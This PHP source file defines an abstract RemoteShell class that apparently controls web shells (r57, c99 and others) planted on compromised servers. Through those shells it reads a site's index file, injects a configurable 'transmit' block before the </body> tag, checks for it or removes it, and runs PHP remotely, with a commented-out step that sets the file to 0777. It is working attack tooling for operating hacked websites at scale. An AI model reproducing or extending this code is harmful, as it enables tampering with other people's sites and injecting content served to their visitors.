<?php

abstract class RemoteShell
{
	/**
	 * @var ShellRow
	 */
	protected $_shell = null;

	/**
	 * @param ShellRow $shellRow
	 * @return RemoteShell
	 */
	public function __construct($shellRow)
	{
		if (!$shellRow instanceof ShellRow) {
			throw new RemoteShell_Exception('Cant create RemoteShell instranse with invalid ShellRow');
		}

		$this->_shell = $shellRow;
	}

	/**
	 * @param ShellRow $shellRow
	 * @param Zend_Http_Response $response
	 * @return RemoteShell
	 */
	public static function factory($shellRow, $response = null)
	{
		if ($response instanceof Zend_Http_Response) {
			self::_checkResponse($response);

			$body = $response->getBody();
			if (false !== stripos($body, 'r57shell')) {
				return new RemoteShell_r57($shellRow);
			}

			if (false !== stripos($body, 'c99madshell')) {
				return new RemoteShell_c99($shellRow);
			}

			if (false !== stripos($body, '<!--[SR:011]-->')) {
				return new RemoteShell_Old($shellRow);
			}

			throw new RemoteShell_Exception('Cant define shell type');
		}

		// Shell type is ftp
		$url = $shellRow->__get('url');
		$uri = Uri::factory($url);
		if ($uri instanceof Uri_Ftp) {
			return new RemoteShell_Ftp($shellRow);
		}

		if ($typeId = $shellRow->__get('shell_type_id')) {
			$type = ShellType::getInstance()->find($typeId)->current();
			switch ($key = $type->__get('key')) {
				case 'r57' :
					return new RemoteShell_r57($shellRow);
					break;
				case 'c99' :
					return new RemoteShell_c99($shellRow);
					break;
				case 'old' :
					return new RemoteShell_Old($shellRow);
					break;
				default :
					throw new RemoteShell_Exception('Invalid shell type key: ' . $key);
			}
		}

		throw new RemoteShell_Exception('Shell type not supported');
	}

	/**
	 * @return string Shell uri
	 */
	protected function _getUrl()
	{
		return $this->_shell->__get('url');
	}

	/**
	 * @return string Path to index file
	 * @throws RemoteShell_FileException
	 */
	protected function _getPath()
	{
		$path = $this->_shell->__get('path');
		if (!$path) {
			throw new RemoteShell_FileException('Path not specified');
		}

		return $path;
	}

	/**
	 * @return string
	 * @throws RemoteShell_Exception
	 */
	public function _getTransmit()
	{
		if (!$this->_shell->__get('transmit_id')) {
			throw new RemoteShell_Exception('Transmit not specified');
		}

		$transmitRow = $this->_shell->findDependentRowset('Transmit')->current();

		if (Config::getInstance()->plugin->randomizeTransmit) {
			return $transmitRow->randomize();
		}

		return $transmitRow->__get('text');
	}

	/**
	 * Get content of shell->path file
	 * @return string
	 */
	public function getContent()
	{
		$path = $this->_getPath();
		return $this->_fileGetContents($path);
	}

	/**
	 * Set content of shell->path file
	 *
	 * @param string $content for set
	 * @return boolean
	 */
	public function setContent($content)
	{
		$path = $this->_getPath();
		return $this->_filePutContents($path, $content);
	}

	/**
	 * @return boolean
	 */
	public function write()
	{
		$check = $this->_shell->check();
		$this->_shell->save();
		if (!$check) {
			return false;
		}

		$content = $this->getContent();
		$transmit = $this->_getTransmit();

		$tags = $this->_getTransmitTags();
		$localTransmit = $tags['open']
			. $transmit
			. $tags['close'];


		$remoteTransmit = $this->_getTransmitByContent($content);
		if ($remoteTransmit) {
			$content = str_replace($remoteTransmit, $localTransmit, $content);
		} else {
			// Try to write before </body> tag
			if (false !== stripos($content, '</body>')) {
				$content = str_ireplace('</body>', $localTransmit . '</body>', $content);
			} else {
				$content .= $localTransmit;
			}
		}

		/*$path = $this->_getPath();
		$code = "
			clearstatcache();
			echo substr(sprintf('%o', fileperms('$path')), -4);
		";
		$mode = $this->_evalPhp($code);

		$this->_chmod("0777");*/
		$this->setContent($content);
		//$this->_chmod($mode);

		return true;
	}

	/**
	 * @return boolean
	 */
	public function check()
	{
		$check = $this->_shell->check();
		$this->_shell->save();
		if (!$check) {
			return false;
		}

		$content = $this->getContent();

		$withoutTags = 1;
		$remoteTransmit = $this->_getTransmitByContent($content, $withoutTags);
		if (!$remoteTransmit) {
			return false;
		}

		return true;
	}

	/**
	 * @return boolean
	 */
	public function delete()
	{
		$check = $this->_shell->check();
		$this->_shell->save();
		if (!$check) {
			return false;
		}

		$content = $this->getContent();

		$withoutTags = 1;
		$remoteTransmit = $this->_getTransmitByContent($content, $withoutTags);
		if (!$remoteTransmit) {
			return true;
		}

		$content = str_replace($remoteTransmit, '', $content);

		$this->setContent($content);
		return true;
	}

	/**
	 * In case of file exists any transmit block return him
	 *
	 * @param string $content Full content of remote file
	 * @param boolean $withoutTags Flag for return transmit block without tags
	 * @return string
	 */
	protected function _getTransmitByContent($content, $withoutTags = 0)
	{
		$tags = $this->_getTransmitTags();
		$regex = '~' . $tags['open']
			. '(.*?)'
			. $tags['close'] . '~is';

		$matches = array();
		preg_match($regex, $content, $matches);
		if (isset($matches[$withoutTags])) {
			return $matches[$withoutTags];
		}

		return '';
	}


	/**
	 * Return array with open and close transmit tags from config or default
	 * @return array
	 */
	protected function _getTransmitTags()
	{
		if (($open = Config::getInstance()->transmit->open) && ($close = Config::getInstance()->transmit->close)) {
			return array('open' => $open, 'close' => $close);
		}

		return array('open' => '<!--transmit-->', 'close' => '<!--/transmit-->');
	}

	/**
	 * Return new Zend_Http_Client and set basic HTTP auth
	 * @return Zend_Http_Client
	 */
	protected function _getClient()
	{
		$uri = Zend_Uri::factory($this->_getUrl());

		$client = new Zend_Http_Client($uri);

		if ($user = $uri->getUsername()) {
			$password = $uri->getPassword();
			$client->setAuth($user, $password);
		}

		return $client;
	}

	/**
	 * Check response for valid body and code
	 *
	 * @param Zend_Http_Response $response
	 * @return boolean
	 * @throws RemoteShell_Exception
	 */
	protected static function _checkResponse($response)
	{
		if ($response->isError()) {
			throw new RemoteShell_Exception('Bad HTTP response: ' . $response->getMessage());
		}

		if (!$response->getBody()) {
			throw new RemoteShell_Exception('Response body is empty');
		}

		return true;
	}

	protected function _chmod($mode)
	{
		$path = $this->_getPath();
		$code = "var_dump(chmod('$path', $mode));";
		$result = $this->_evalPhp($code);
		var_dump($result);
	}

	/**
	 * @param string $body HTML content
	 * @return string
	 */
	abstract function getError($body);

	/**
	 * @return ShellType
	 */
	abstract function getShellType();


	/**
	 * Return full file content getting by remote shell.
	 *
	 * @param string $url Shell uri
	 * @param string $path Full path to remote file
	 * @return string Content of file
	 */
	abstract function _fileGetContents($path);

	/**
	 * Write content into file on remote shell
	 *
	 * @param string $path Full path to remote file
	 * @param string $content Content for write to file
	 * @return boolean
	 */
	abstract function _filePutContents($path, $content);

	/**
	 * Eval php code on shell
	 *
	 * @param string $code PHP code
	 * @return string PHP response
	 */
	abstract function _evalPhp($code);

}